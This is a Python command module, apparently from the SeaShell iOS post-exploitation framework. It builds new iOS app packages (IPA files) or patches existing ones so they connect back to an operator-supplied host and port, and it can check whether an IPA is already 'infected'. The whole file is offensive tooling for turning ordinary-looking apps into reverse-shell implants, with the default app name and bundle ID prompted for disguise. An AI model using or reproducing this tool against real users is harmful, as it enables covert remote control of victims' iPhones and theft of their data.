"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.core.ipa import IPA
from seashell.core.hook import Hook

from pex.proto.tcp import TCPTools

from badges.cmd import Command


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "manage",
            'Name': "ipa",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Manage IPA file generator.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-c', '--check'),
                    {
                        'help': "Check if IPA file is infected.",
                        'metavar': 'FILE',
                    }
                ),
                (
                    ('-p', '--patch'),
                    {
                        'help': "Patch existing IPA file.",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-b', '--build'),
                    {
                        'help': 'Build new IPA file.',
                        'action': 'store_true'
                    }
                )
            ]
        })

    def rpc(self, *args):
        if len(args) < 4:
            return

        if args[0] == 'patch':
            hook = Hook(args[2], args[3])
            hook.patch_ipa(args[1])

        elif args[0] == 'build':
            ipa = IPA(args[2], args[3])
            ipa.generate(args[1])

    def run(self, args):
        local_host = TCPTools.get_local_host()

        if args.check:
            if IPA(None, None).check_ipa(args.check):
                self.print_information("IPA is built or patched.")
            else:
                self.print_information("IPA is original.")

        elif args.patch:
            if IPA(None, None).check_ipa(args.patch):
                self.print_warning("This IPA was already patched.")
                return

            host = self.input_arrow(f"Host to connect back ({local_host}): ")
            host = host or local_host

            port = self.input_arrow("Port to connect back (8888): ")
            port = port or 8888

            hook = Hook(host, port)
            hook.patch_ipa(args.patch)

            self.print_success(f"IPA at {args.patch} patched!")

        elif args.build:
            name = self.input_arrow("Application name (Mussel): ")
            bundle_id = self.input_arrow("Bundle ID (com.entysec.mussel): ")

            icon = self.input_question("Add application icon [y/N]: ")
            icon_path = None

            if icon.lower() in ['y', 'yes']:
                icon_path = self.input_arrow("Icon file path: ")

            host = self.input_arrow(f"Host to connect back ({local_host}): ")
            host = host or local_host

            port = self.input_arrow("Port to connect back (8888): ")
            port = port or 8888

            path = self.input_arrow("Path to save the IPA: ")

            ipa = IPA(host, port)
            ipa.set_name(name, bundle_id)

            if icon_path:
                ipa.set_icon(icon_path)

            self.print_success(f"IPA saved to {ipa.generate(path)}!")
